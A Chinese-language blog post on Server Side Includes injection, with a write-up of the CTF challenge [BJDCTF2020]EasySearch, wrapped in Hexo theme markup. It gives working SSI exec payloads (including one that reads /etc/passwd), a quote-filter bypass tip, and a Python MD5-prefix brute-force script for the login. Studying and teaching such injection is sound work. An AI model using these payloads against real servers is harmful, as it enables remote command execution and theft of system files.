@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SSI全称：server side includes injection 服务器端包含注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSI注入漏洞">
+<meta property="og:url" content="http://example.com/2023/08/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="057lwq&#39;s Blog">
+<meta property="og:description" content="SSI全称：server side includes injection 服务器端包含注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/buu/7-2.png">
+<meta property="og:image" content="http://example.com/images/buu/7-3.png">
+<meta property="og:image" content="http://example.com/images/buu/7-5.png">
+<meta property="og:image" content="http://example.com/images/buu/7-4.png">
+<meta property="og:image" content="http://example.com/images/buu/7-6.png">
+<meta property="og:image" content="http://example.com/images/buu/7-7.png">
+<meta property="og:image" content="http://example.com/images/buu/7-8.png">
+<meta property="article:published_time" content="2023-08-14T06:22:35.000Z">
+<meta property="article:modified_time" content="2023-09-11T14:16:28.491Z">
+<meta property="article:author" content="lwq">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/buu/7-2.png">
+
+<link rel="canonical" href="http://example.com/2023/08/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SSI注入漏洞 | 057lwq's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">057lwq's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lwq">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="057lwq's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSI注入漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-14 14:22:35" itemprop="dateCreated datePublished" datetime="2023-08-14T14:22:35+08:00">2023-08-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-11 22:16:28" itemprop="dateModified" datetime="2023-09-11T22:16:28+08:00">2023-09-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h1><p>全称：server side includes injection 服务器端包含注入</p>
+<span id="more"></span>
+<p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。它与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI</p>
+<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
+<p>在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
+<p>一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。</p>
+<h1 id="SSI漏洞产生的条件"><a href="#SSI漏洞产生的条件" class="headerlink" title="SSI漏洞产生的条件"></a>SSI漏洞产生的条件</h1><p>用户存在可控输入，并且未过滤，并且还能回显嵌入到html中，如其中一条<br><code>    &lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令）</code><br>通常存在XSS的地方如果开启了SSI服务，那么就会造成服务器注入<br><code>  &lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;（会显示给定的文件）</code></p>
+<h1 id="SSI命令语法解析"><a href="#SSI命令语法解析" class="headerlink" title="SSI命令语法解析"></a>SSI命令语法解析</h1><table>
+<thead>
+<tr>
+<th>指令名称</th>
+<th>参数列表</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>config</td>
+<td>errmsg,timefmt,sizefmt</td>
+</tr>
+<tr>
+<td>include</td>
+<td>virtual,file</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>var</td>
+</tr>
+<tr>
+<td>fsize</td>
+<td>file</td>
+</tr>
+<tr>
+<td>falstmod</td>
+<td>file</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>cmd,cgi</td>
+</tr>
+</tbody></table>
+<h2 id="显示服务器端环境变量-lt-echo-gt"><a href="#显示服务器端环境变量-lt-echo-gt" class="headerlink" title="显示服务器端环境变量&lt;#echo&gt;"></a>显示服务器端环境变量&lt;#echo&gt;</h2><p>本文档名称：<br><code>&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;</code></p>
+<p>现在时间：<br><code> &lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</code></p>
+<p>显示IP地址：<br><code> &lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code></p>
+<h2 id="将文本内容直接插入到文档中-lt-include-gt"><a href="#将文本内容直接插入到文档中-lt-include-gt" class="headerlink" title="将文本内容直接插入到文档中&lt;#include&gt;"></a>将文本内容直接插入到文档中&lt;#include&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;文件名称&quot;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include virtual=&quot;文件名称&quot;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure>
+<p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
+<h2 id="显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-x2F-大小等"><a href="#显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-x2F-大小等" class="headerlink" title="显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期&#x2F;大小等)"></a>显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期&#x2F;大小等)</h2><p>文件最近更新日期：<br><code>&lt;!--#flastmod file=&quot;文件名称&quot;--&gt;</code></p>
+<p>文件的长度：<br><code>&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</code></p>
+<h2 id="直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序"><a href="#直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序" class="headerlink" title="直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)"></a>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>##一次CTF中用到的指令<br><code> &lt;!--%23include virtual=&quot;flag&quot; --&gt;</code></p>
+<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。  </p>
+<p>2．上面的标点&#x3D;””，一个也不能少。</p>
+<p>3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。</p>
+<p>有的时候可使用&#96;来绕过对”的过滤&#x2F;&#x2F;有时候 有时候，</p>
+<h1 id="SSI漏洞挖掘"><a href="#SSI漏洞挖掘" class="headerlink" title="SSI漏洞挖掘"></a>SSI漏洞挖掘</h1><p>SSI漏洞，一般存在xss的地方都值得一试。</p>
+<p>并非所有文件中的SSI指令都会被解析，必须告诉Apache应该解析哪些文件。有两种方法使Apache解析带有特定后缀名的文件，比如：.shtml ，配置如下：</p>
+<p>    AddType text&#x2F;html .shtml</p>
+<p>    AddOutputFilter INCLUDES .shtml</p>
+<p>.stm，.shtm和.shtml的页面是否存在文件后缀名是用来表明网页文件是否包含SSI指令的，因此如果该网站使用了.shtml文件，那说明该网站支持SSI指令。然而.shtml后缀名并非是强制规定的，因此如果没有发现任何.shtml文件，并不意味着目标网站没有受到SSI注入攻击的可能。</p>
+<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>扫描一下网站目录，发现index.php.swp,访问发现是源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;</span><br><span class="line">		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码审计一下，发现密码前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中<br>大佬的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string = &#x27;0123456789&#x27;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #父类的构造方法</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin = &#x27;6d0bc1&#x27;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">            if s[:6] == admin:</span><br><span class="line">                print i</span><br><span class="line">threads = []</span><br><span class="line">thread_count = 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>
+<p>扫到了2020666、2305004、9162671<br>随便使用一个即可登录<br>登陆后在表头处发现一个url<br><img src="/images/buu/7-2.png" alt="1"><br>此处可以使用ssi注入漏洞<br><img src="/images/buu/7-3.png" alt="1"><br>在用户名处输入<code>&lt;!--#exec cmd=&quot;ls&quot;--&gt;</code><br><img src="/images/buu/7-5.png" alt="1"><br>访问新的url<br><img src="/images/buu/7-4.png" alt="1"><br>查看上一层目录<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code><br><img src="/images/buu/7-6.png" alt="1"><br><img src="/images/buu/7-7.png" alt="1"><br>在用户名出输入<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code><br>再访问url，得到flag<br><img src="/images/buu/7-8.png" alt="1"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/30/nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="prev" title="nmap常用命令">
+      <i class="fa fa-chevron-left"></i> nmap常用命令
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/09/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/" rel="next" title="刷题记录3">
+      刷题记录3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSI"><span class="nav-number">1.</span> <span class="nav-text">SSI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSI%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">SSI漏洞产生的条件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSI%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">SSI命令语法解析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-lt-echo-gt"><span class="nav-number">3.1.</span> <span class="nav-text">显示服务器端环境变量&lt;#echo&gt;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%86%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E5%88%B0%E6%96%87%E6%A1%A3%E4%B8%AD-lt-include-gt"><span class="nav-number">3.2.</span> <span class="nav-text">将文本内容直接插入到文档中&lt;#include&gt;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E7%A4%BAWEB%E6%96%87%E6%A1%A3%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF-lt-flastmod-gt-lt-fsize-gt-%E5%A6%82%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E6%97%A5%E6%9C%9F-x2F-%E5%A4%A7%E5%B0%8F%E7%AD%89"><span class="nav-number">3.3.</span> <span class="nav-text">显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期&#x2F;大小等)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%90%84%E7%A7%8D%E7%A8%8B%E5%BA%8F-lt-exec-gt-%E5%A6%82CGI%E6%88%96%E5%85%B6%E4%BB%96%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-number">3.4.</span> <span class="nav-text">直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="nav-number">3.5.</span> <span class="nav-text">注意：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSI%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">4.</span> <span class="nav-text">SSI漏洞挖掘</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-EasySearch"><span class="nav-number">5.</span> <span class="nav-text">[BJDCTF2020]EasySearch</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lwq</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lwq</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
